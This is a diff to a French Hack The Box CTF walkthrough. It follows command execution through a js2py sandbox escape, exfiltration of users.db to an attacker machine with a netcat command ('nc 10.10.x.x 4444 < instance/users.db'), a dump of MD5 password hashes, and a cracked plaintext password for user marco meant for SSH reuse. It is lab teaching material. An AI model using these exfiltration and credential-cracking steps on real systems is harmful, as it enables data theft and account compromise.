@@ -508,15 +508,35 @@ templates/
 Plusieurs répertoires sont présents, mais le fichier **`app.py`** attire immédiatement l’attention.
 
 Dans de nombreuses applications Python basées sur **Flask** ou des frameworks similaires, ce fichier constitue le **point d’entrée de l’application**.
- C’est généralement dans ce fichier que sont définies :
+C’est généralement dans ce fichier que sont définies :
 
 - les **routes de l’application**
 - la **logique applicative**
 - les fonctions qui traitent les **données envoyées par les utilisateurs**
 
-Autrement dit, analyser ce fichier permet souvent de comprendre **le fonctionnement interne de l’application** et de repérer les endroits où une **vulnérabilité pourrait être exploitée**.
+En explorant le répertoire **`instance/`**, tu trouves également une base de données SQLite nommée **`users.db`**.
 
-Dans la section suivante, tu vas donc **examiner le fichier `app.py`** afin d’identifier les fonctionnalités exposées par l’application.
+```bash
+ls instance/
+
+users.db
+```
+
+Tu peux l’ouvrir avec **sqlite3** afin d’examiner son contenu :
+
+```bash
+sqlite3 instance/users.db
+```
+
+Cependant, cette base de données locale est **vide** et ne contient aucun utilisateur.
+
+Cela indique que les comptes sont plus **que probablement créés dynamiquement sur la machine cible**.
+
+Pour comprendre comment l’application gère ces comptes, il est utile d’examiner **`app.py`**, qui contient la logique principale de l’application.
+
+Analyser **`app.py`** permet souvent de comprendre **le fonctionnement interne de l’application** et d’identifier les parties du code où une **vulnérabilité pourrait être présente**.
+
+Tu peux donc maintenant **examiner ce fichier** afin d’identifier les différentes fonctionnalités exposées par l’application.
 
 ### Identification de la fonctionnalité d’exécution de code
 En poursuivant l’analyse du projet, deux fichiers sont particulièrement utiles :
@@ -741,11 +761,171 @@ uid=1001(app) gid=1001(app) groups=1001(app)
 Cette réponse confirme que le payload parvient bien à **sortir de la sandbox js2py et à exécuter une commande système sur le serveur**.
 
 ### Extraction de données sensibles
+
+Une fois l’évasion de la sandbox confirmée, tu peux utiliser l’interface web **comme une sorte de session distante sur le serveur**.
+
+Chaque payload exécuté via le bouton **Run Code** permet en effet de lancer une commande système et d’afficher le résultat dans la zone **Output** du dashboard.
+
+Tu peux donc commencer par exécuter quelques commandes classiques afin de mieux comprendre l’environnement dans lequel tourne l’application :
+
+```texte
+let cmd = "id; whoami; pwd; ls /home/"
+```
+
+Après avoir cliqué sur **Run Code**, l’application renvoie le résultat suivant :
+
+```texte
+uid=1001(app) gid=1001(app) groups=1001(app)
+app
+/home/app/app
+app marco
+```
+
+Ces informations permettent déjà d’identifier plusieurs éléments importants :
+
+- l’application s’exécute avec l’utilisateur **`app`**
+- le répertoire de travail est **`/home/app/app`**
+- le répertoire **`/home/`** contient deux comptes utilisateurs : **`app`** et **`marco`**
+
+La présence de l’utilisateur **`marco`** est particulièrement intéressante, car elle indique qu’un **compte système supplémentaire** existe sur la machine.
+
+À partir de là, tu peux continuer l’exploration du système afin d’identifier **des fichiers sensibles accessibles depuis l’application**, comme des fichiers de configuration ou des bases de données contenant des i
+
 #### Récupération de la base instance/users.db
+
+L’analyse du **code source de l’application** montre également que les comptes utilisateurs ainsi que leurs identifiants sont stockés dans une base de données SQLite nommée **`users.db`**, située dans le répertoire **`instance/`** de l’application.
+
+Comme l’exécution de commandes système fonctionne désormais, tu peux vérifier si ce fichier est bien présent sur le serveur.
+
+Par exemple, l’exécution du payload suivant :
+
+```texte
+let cmd = "ls instance/"
+```
+
+renvoie bien :
+
+```texte
+users.db
+```
+
+Ce résultat confirme que la base de données **`users.db`** est bien accessible dans le répertoire **`instance/`** de l’application.
+
+Comme l’exécution de commandes fonctionne maintenant, il est possible de **copier la base de données vers ta machine Kali** afin de l’analyser localement.
+
+Pour cela, tu peux utiliser **`nc` (netcat)** afin d’envoyer le fichier depuis la machine cible vers ta machine d’attaque, comme expliqué dans la recette {{< recette "copier-fichiers-kali" >}}.
+
+Depuis l’interface **Run Code**, envoie le payload suivant en remplaçant l’adresse IP par celle de ta machine Kali :
+
+```texte
+let cmd = "nc 10.10.x.x 4444 < instance/users.db"
+```
+
+Du côté de ta machine **Kali**, commence par ouvrir un port en écoute afin de recevoir le fichier :
+
+```bash
+nc -lnvp 4444 > local_users.db
+```
+
+Lorsque le payload est exécuté, la base de données **`users.db`** est alors transférée vers ta machine Kali et enregistrée dans le fichier **`local_users.db`**, ce qui permet de **l’analyser localement**.
+
 #### Analyse de la base SQLite
 
+Tu peux maintenant analyser la base de données récupérée avec **`sqlite3`** :
+
+```bash
+sqlite3 local_users.db
+```
+
+Dans l’interface SQLite, commence par lister les tables présentes dans la base :
+
+```sqlite
+.tables
+```
+
+Le résultat montre deux tables :
+
+```sqlite
+code_snippet  user
+```
+
+La table **`user`** est particulièrement intéressante, car elle contient les comptes de l’application.
+
+Tu peux d’abord examiner sa structure :
+
+```sqlite
+.schema user
+CREATE TABLE user (
+	id INTEGER NOT NULL, 
+	username VARCHAR(80) NOT NULL, 
+	password_hash VARCHAR(128) NOT NULL, 
+	PRIMARY KEY (id), 
+	UNIQUE (username)
+);
+```
+
+Ce schéma montre que la table stocke :
+
+- un **identifiant utilisateur**
+- un **nom d’utilisateur**
+- un **hash de mot de passe**
+
+Tu peux ensuite afficher le contenu de la table :
+
+```sqlite
+select * from user;
+```
+
+La base renvoie alors :
+
+```sqlite
+1|marco|649c9d65a206a75f5abe509fe128bce5
+2|app|a97588c0e2fa3a024876339e27aeb42e
+```
+
+Cette table contient donc deux comptes :
+
+- **`marco`**
+- **`app`**
+
+L’utilisateur **`app`** correspond au compte sous lequel l’application s’exécute sur le serveur.
+
+En revanche, l’utilisateur **`marco`** est particulièrement intéressant dans le contexte de l’exploitation.
+ Lors de l’exploration du système, tu avais déjà vu que deux répertoires existaient dans **`/home/`** :
+
+```bash
+/home/app
+/home/marco
+```
+
+La présence de **`marco`** dans la base confirme donc qu’il s’agit bien d’un **compte utilisateur du système**, ce qui en fait un bon candidat pour tenter **une connexion SSH sur la machine**.
+
+#### Crack du hash du mot de passe
+
+La table **`user`** contient un champ **`password_hash`** qui stocke le hash du mot de passe des utilisateurs.
+
+Pour tenter de retrouver le mot de passe associé à l’utilisateur **`marco`**, tu peux soumettre ce hash à un service de recherche de hash public, par exemple **crackstation.net**.
+
+![Résultat CrackStation pour le hash MD5 de l’utilisateur marco extrait de la base users.db](crackstation_utilisateur_marco.png)
+
+
+
+Le mot de passe associé à l’utilisateur **`marco`** est :
+
+```
+sweetangelbabylove
+```
+
+Tu disposes maintenant d’un **couple identifiant / mot de passe** potentiellement utilisable :
+
+```
+marco : sweetangelbabylove
+```
+
+Dans de nombreux CTF Hack The Box, les identifiants récupérés peuvent être réutilisés sur d’autres services exposés par la machine, notamment SSH.
+
 ### Connexion SSH avec l’utilisateur marco
-## Récupération du user flag
+### Récupération du user flag
 
 
 
